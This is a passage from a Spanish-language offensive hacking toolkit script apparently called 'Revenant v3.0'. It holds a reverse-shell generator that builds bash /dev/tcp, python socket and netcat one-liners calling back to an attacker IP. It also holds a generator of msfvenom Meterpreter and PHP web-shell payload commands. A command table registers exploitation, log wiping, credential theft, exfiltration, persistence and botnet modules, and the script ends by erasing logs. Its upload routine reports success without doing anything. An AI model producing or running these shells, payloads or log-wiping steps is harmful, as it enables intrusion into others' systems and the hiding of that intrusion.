        ruta_local = __nini_pedir("Ruta del archivo local: ")
    if (ruta_local == "") then; return
        ruta_remota = __nini_pedir("Ruta remota de destino: ")
    if (ruta_remota == "") then; return
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Subiendo archivo..." + "</color>")
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Upload completado." + "</color>")
end function
    modulo_exfil_reverse_shell = function()
        ip_atacante = __nini_pedir("Tu IP: ")
    if (ip_atacante == "") then; ip_atacante = "127.0.0.1"
        puerto = __nini_pedir("Puerto de callback: ")
    if (puerto == "") then; puerto = "4444"
        opciones_shell = [
        {"label": "Bash Reverse Shell", "cmd": "bash"},
        {"label": "Python", "cmd": "python"},
        {"label": "Netcat", "cmd": "netcat"},
        ]
        tipo_shell = menu_interactivo("GENERADOR DE REVERSE SHELL", opciones_shell)
    if (not tipo_shell) then; return
        shell_generado = ""
    if (tipo_shell == "bash") then
            shell_generado = "bash -i >& /dev/tcp/" + ip_atacante + "/" + puerto + " 0>&1"
    else if (tipo_shell == "python") then
                shell_generado = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((" + chr(34) + ip_atacante + chr(34) + "," + puerto + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([" + chr(34) + "/bin/sh" + chr(34) + "," + chr(34) + "-i" + chr(34) + "])'"
    else if (tipo_shell == "netcat") then
                    shell_generado = "nc -e /bin/sh " + ip_atacante + " " + puerto
end if
        dibujar_ventana("REVERSE SHELL GENERADO", shell_generado)
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Copia and ejecuta in el objetivo." + "</color>")
        print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Listener: nc -lvp " + puerto + "</color>")
end function
    modulo_payloads_generar = function()
        ip_atacante = __nini_pedir("LHOST (tu IP): ")
    if (ip_atacante == "") then; ip_atacante = "127.0.0.1"
        puerto = __nini_pedir("LPORT: ")
    if (puerto == "") then; puerto = "4444"
        opciones_payload = [
        {"label": "Linux Shell", "cmd": "linux"},
        {"label": "Windows Meterpreter", "cmd": "windows"},
        {"label": "PHP Web Shell", "cmd": "php"},
        ]
        tipo_payload = menu_interactivo("GENERADOR DE PAYLOADS", opciones_payload)
    if (not tipo_payload) then; return
        payload_info = ""
    if (tipo_payload == "linux") then
            payload_info = "linux/x86/shell_reverse_tcp"
            print("<color=#00e5ff>[#] </color><color=#ffffff>" + "msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f elf > payload.elf" + "</color>")
    else if (tipo_payload == "windows") then
                payload_info = "windows/meterpreter/reverse_tcp"
                print("<color=#00e5ff>[#] </color><color=#ffffff>" + "msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f exe > payload.exe" + "</color>")
    else if (tipo_payload == "php") then
                    payload_info = "php/meterpreter/reverse_tcp"
                    print("<color=#00e5ff>[#] </color><color=#ffffff>" + "msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f raw > shell.php" + "</color>")
end if
        print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Payload configurado for " + ip_atacante + ":" + puerto + "</color>")
end function
// Modo Ninja Activado
inicializar_vault()
Shell.registrar("scan", escanear_puertos, "Escanear puertos")
Shell.registrar("scanred", escanear_red, "Escanear red")
Shell.registrar("whois", whois_objetivo, "WHOIS")
Shell.registrar("hack", explotar_objetivo, "Explotar")
Shell.registrar("router", explotar_router, "Explotar router")
Shell.registrar("limpiarlogs", limpiar_logs, "Limpiar logs")
Shell.registrar("jump", jump_manual, "Jump")
Shell.registrar("scanjump", scan_and_jump, "Scan and Jump")
Shell.registrar("sesiones", jump_listar, "Listar sesiones")
Shell.registrar("buffer", Buffer.list, "Ver BUFFER")
Shell.registrar("clearbuffer", Buffer.clear, "Limpiar BUFFER")
Shell.registrar("aliases", Aliases.listar, "Ver aliases")
Shell.registrar("alias", Aliases.agregar, "Crear alias")
Shell.registrar("kernel", Kernel.info, "Info kernel")
Shell.registrar("escanear", escanear_puertos, "Escanear")
Shell.registrar("espectro", modulo_espectro_recon, "Recon")
Shell.registrar("asalto", modulo_asalto_root, "Asalto")
Shell.registrar("escalada", modulo_escalada_analizar, "Escalada")
Shell.registrar("vault", listar_credenciales, "Vault")
Shell.registrar("intel", modulo_intel_saquear, "Intel")
Shell.registrar("exfil", modulo_exfil_menu, "Exfil")
Shell.registrar("persistencia", modulo_persistencia_configurar, "Persistencia")
Shell.registrar("ses", modulo_botnet_menu, "Sesiones")
Banner.mostrar()
print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Revenant v3.0 - 'ayuda' for comandos" + "</color>")
iniciar_repl()
__nini_clean_logs()
print("<color=gray>[Modo Ninja]</color> Huellas borradas exitosamente.")